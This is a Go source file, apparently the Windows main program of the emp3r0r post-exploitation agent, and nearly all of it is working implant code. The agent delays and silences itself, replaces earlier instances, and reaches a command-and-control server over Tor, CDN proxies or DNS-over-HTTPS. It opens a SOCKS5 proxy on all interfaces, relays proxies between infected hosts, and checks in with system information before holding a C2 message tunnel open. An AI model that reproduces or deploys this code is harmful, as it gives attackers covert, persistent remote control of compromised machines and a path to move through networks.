//go:build windows
// +build windows

package main

import (
	"context"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/lib/agent"
	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
	"github.com/ncruces/go-dns"
)

func main() {
	var err error
	c2proxy := flag.String("proxy", "", "Proxy for emp3r0r agent's C2 communication")
	cdnProxy := flag.String("cdnproxy", "", "CDN proxy for emp3r0r agent's C2 communication")
	doh := flag.String("doh", "", "DNS over HTTPS server for CDN proxy's DNS requests")
	replace := flag.Bool("replace", false, "Replace existing agent process")
	silent := flag.Bool("silent", false, "Suppress output")
	daemon := flag.Bool("daemon", false, "Daemonize")
	version := flag.Bool("version", false, "Show version info")
	flag.Parse()

	// applyRuntimeConfig
	err = agent.ApplyRuntimeConfig()
	if err != nil {
		log.Fatalf("ApplyRuntimeConfig: %v", err)
	}

	// version
	if *version {
		fmt.Printf("emp3r0r agent (%s)\n", emp3r0r_data.Version)

		return
	}

	// don't be hasty
	time.Sleep(time.Duration(util.RandInt(3, 10)) * time.Second)

	// mkdir -p UtilsPath
	// use absolute path
	// TODO find a better location for temp files
	if !util.IsFileExist(agent.RuntimeConfig.UtilsPath) {
		err = os.MkdirAll(agent.RuntimeConfig.UtilsPath, 0700)
		if err != nil {
			log.Fatalf("[-] Cannot mkdir %s: %v", agent.RuntimeConfig.AgentRoot, err)
		}
	}

	// silent switch
	log.SetOutput(ioutil.Discard)
	log.SetFlags(log.Ldate | log.Ltime | log.Lmicroseconds | log.Lshortfile)
	if !*silent {
		fmt.Println("emp3r0r agent has started")
		log.SetOutput(os.Stderr)

		// redirect everything to log file
		f, err := os.OpenFile(fmt.Sprintf("%s/emp3r0r.log",
			agent.RuntimeConfig.AgentRoot),
			os.O_RDWR|os.O_CREATE|os.O_APPEND, 0600)
		if err != nil {
			log.Printf("error opening emp3r0r.log: %v", err)
		} else {
			log.SetOutput(f)
		}
	}

	// PATH
	os.Setenv("PATH", fmt.Sprintf("%s:/bin:/usr/bin:/usr/local/bin", agent.RuntimeConfig.UtilsPath))

	// HOME
	u, err := user.Current()
	if err != nil {
		log.Printf("Get user info: %v", err)
	} else {
		os.Setenv("HOME", u.HomeDir)
	}

	// extract bash
	err = agent.ExtractBash()
	if err != nil {
		log.Printf("[-] Cannot extract bash: %v", err)
	}
	if !util.IsFileExist(emp3r0r_data.DefaultShell) {
		emp3r0r_data.DefaultShell = "/bin/sh"
	}

	// daemonize
	if *daemon {
		args := os.Args[1:]
		i := 0
		for ; i < len(args); i++ {
			if args[i] == "-daemon=true" || args[i] == "-daemon" {
				args[i] = "-daemon=false"
				break
			}
		}
		cmd := exec.Command(os.Args[0], args...)
		err := cmd.Start()
		if err != nil {
			log.Fatal(err)
		}
		log.Printf("%s is starting in background wit PID %d...", os.Args[0], cmd.Process.Pid)
		os.Exit(0)
	}

	// if the agent's process name is not "emp3r0r"
test_agent:
	alive, pid := agent.IsAgentRunningPID()
	if alive {
		proc, err := os.FindProcess(pid)
		if err != nil {
			log.Println("WTF? The agent is not running, or is it?")
		}

		// exit, leave the existing agent instance running
		if !*replace {
			log.Printf("[%d->%d] Agent is already running and responsive, waiting...",
				os.Getppid(),
				os.Getpid())

			util.TakeASnap()
			goto test_agent
		}

		// if agent is not responsive, kill it, and start a new instance
		// after IsAgentAlive(), the PID file gets replaced with current process's PID
		// if we kill it, we will be killing ourselves
		if proc.Pid != os.Getpid() {
			err = proc.Kill()
			if err != nil {
				log.Println("Failed to kill old emp3r0r", err)
			}
		}
	}

	// if CC is behind tor, a proxy is needed
	if tun.IsTor(emp3r0r_data.CCAddress) {
		emp3r0r_data.CCAddress = fmt.Sprintf("%s/", emp3r0r_data.CCAddress)
		log.Printf("CC is on TOR: %s", emp3r0r_data.CCAddress)
		emp3r0r_data.Transport = fmt.Sprintf("TOR (%s)", emp3r0r_data.CCAddress)
		agent.RuntimeConfig.AgentProxy = *c2proxy
		if *c2proxy == "" {
			agent.RuntimeConfig.AgentProxy = "socks5://127.0.0.1:9050"
		}
		log.Printf("CC is on TOR (%s), using %s as TOR proxy", emp3r0r_data.CCAddress, agent.RuntimeConfig.AgentProxy)
	} else {
		// parse C2 address
		emp3r0r_data.CCAddress = fmt.Sprintf("%s:%s/", emp3r0r_data.CCAddress, agent.RuntimeConfig.CCPort)
	}
	log.Printf("CCAddress is: %s", emp3r0r_data.CCAddress)

	// if user specified a proxy, use it
	if *c2proxy != "" {
		agent.RuntimeConfig.AgentProxy = *c2proxy
	}

	// DNS
	if *doh != "" {
		agent.RuntimeConfig.DoHServer = *doh
	}
	if agent.RuntimeConfig.DoHServer != "" {
		// use DoH resolver
		net.DefaultResolver, err = dns.NewDoHResolver(
			agent.RuntimeConfig.DoHServer,
			dns.DoHCache())
		if err != nil {
			log.Fatal(err)
		}
	}

	// if user wants to use CDN proxy
	if *cdnProxy != "" {
		agent.RuntimeConfig.CDNProxy = *cdnProxy
	}
	upper_proxy := agent.RuntimeConfig.AgentProxy // when using CDNproxy
	if agent.RuntimeConfig.CDNProxy != "" {
		log.Printf("C2 is behind CDN, using CDNProxy %s", agent.RuntimeConfig.CDNProxy)
		cdnproxyAddr := fmt.Sprintf("socks5://127.0.0.1:%d", util.RandInt(1024, 65535))
		// DoH server
		dns := "https://9.9.9.9/dns-query"
		if agent.RuntimeConfig.DoHServer != "" {
			dns = agent.RuntimeConfig.DoHServer
		}
		go func() {
			for !tun.IsProxyOK(cdnproxyAddr) {
				// typically you need to configure AgentProxy manually if agent doesn't have internet
				// and AgentProxy will be used for websocket connection, then replaced with 10888
				err := cdn2proxy.StartProxy(strings.Split(cdnproxyAddr, "socks5://")[1], agent.RuntimeConfig.CDNProxy, upper_proxy, dns)
				if err != nil {
					log.Printf("CDN proxy at %s stopped (%v), restarting", cdnproxyAddr, err)
				}
			}
		}()
		emp3r0r_data.Transport = fmt.Sprintf("CDN (%s)", agent.RuntimeConfig.CDNProxy)
		agent.RuntimeConfig.AgentProxy = cdnproxyAddr
	}

	// agent root
	if !util.IsFileExist(agent.RuntimeConfig.AgentRoot) {
		err = os.MkdirAll(agent.RuntimeConfig.AgentRoot, 0700)
		if err != nil {
			log.Printf("MkdirAll %s: %v", agent.RuntimeConfig.AgentRoot, err)
		}
	}

	// socks5 proxy
	go func() {
		// start a socks5 proxy
		err := agent.Socks5Proxy("on", "0.0.0.0:"+agent.RuntimeConfig.ProxyPort)
		if err != nil {
			log.Printf("Socks5Proxy on %s: %v", agent.RuntimeConfig.ProxyPort, err)
			return
		}
		defer func() {
			err := agent.Socks5Proxy("off", "0.0.0.0:"+agent.RuntimeConfig.ProxyPort)
			if err != nil {
				log.Printf("Socks5Proxy off (%s): %v", agent.RuntimeConfig.ProxyPort, err)
			}
		}()
	}()

	// do we have internet?
	checkInternet := func(cnt *int) bool {
		if tun.HasInternetAccess() {
			// if we do, we are feeling helpful
			if *cnt == 0 {
				log.Println("[+] It seems that we have internet access, let's start a socks5 proxy to help others")
				ctx, cancel := context.WithCancel(context.Background())
				go agent.StartBroadcast(true, ctx, cancel)
			}
			return true

		} else if !tun.IsTor(emp3r0r_data.CCAddress) && !tun.IsProxyOK(agent.RuntimeConfig.AgentProxy) {
			*cnt++
			// we don't, just wait for some other agents to help us
			log.Println("[-] We don't have internet access, waiting for other agents to give us a proxy...")
			if *cnt == 0 {
				ctx, cancel := context.WithCancel(context.Background())
				go func() {
					log.Printf("[%d] Starting broadcast server to receive proxy", *cnt)
					err := agent.BroadcastServer(ctx, cancel, "")
					if err != nil {
						log.Fatalf("BroadcastServer: %v", err)
					}
				}()
				for ctx.Err() == nil {
					if agent.RuntimeConfig.AgentProxy != "" {
						log.Printf("[+] Thank you! We got a proxy: %s", agent.RuntimeConfig.AgentProxy)
						return true
					}
				}
			}
			return false
		}

		return true
	}
	i := 0
	for !checkInternet(&i) {
		log.Printf("[%d] Checking Internet connectivity...", i)
		time.Sleep(time.Duration(util.RandInt(3, 20)) * time.Second)
	}

	// apply whatever proxy setting we have just added
	emp3r0r_data.HTTPClient = tun.EmpHTTPClient(agent.RuntimeConfig.AgentProxy)
	if agent.RuntimeConfig.AgentProxy != "" {
		log.Printf("Using proxy: %s", agent.RuntimeConfig.AgentProxy)
	} else {
		log.Println("Not using proxy")
	}

connect:
	// check preset CC status URL, if CC is supposed to be offline, take a nap
	if agent.RuntimeConfig.IndicatorWaitMax > 0 &&
		agent.RuntimeConfig.CCIndicator != "" &&
		agent.RuntimeConfig.CCIndicatorText != "" { // check indicator URL or not

		if !agent.IsCCOnline(agent.RuntimeConfig.AgentProxy) {
			log.Println("CC not online")
			time.Sleep(time.Duration(
				util.RandInt(
					agent.RuntimeConfig.IndicatorWaitMin,
					agent.RuntimeConfig.IndicatorWaitMax)) * time.Minute)
			goto connect
		}
	}

	// check in with system info
	err = agent.CheckIn()
	if err != nil {
		log.Println("CheckIn: ", err)
		time.Sleep(5 * time.Second)
		goto connect
	}
	log.Printf("Checked in on CC: %s", emp3r0r_data.CCAddress)

	// connect to MsgAPI, the JSON based h2 tunnel
	msgURL := emp3r0r_data.CCAddress + tun.MsgAPI + "/" + uuid.NewString()
	conn, ctx, cancel, err := agent.ConnectCC(msgURL)
	emp3r0r_data.H2Json = conn
	if err != nil {
		log.Println("ConnectCC: ", err)
		time.Sleep(5 * time.Second)
		goto connect
	}
	log.Println("Connected to CC TunAPI")
	if !util.IsFileExist(agent.RuntimeConfig.UtilsPath + "/bettercap") {
		go agent.VaccineHandler()
	}
	err = agent.CCMsgTun(ctx, cancel)
	if err != nil {
		log.Printf("CCMsgTun: %v, reconnecting...", err)
	}
	goto connect
}
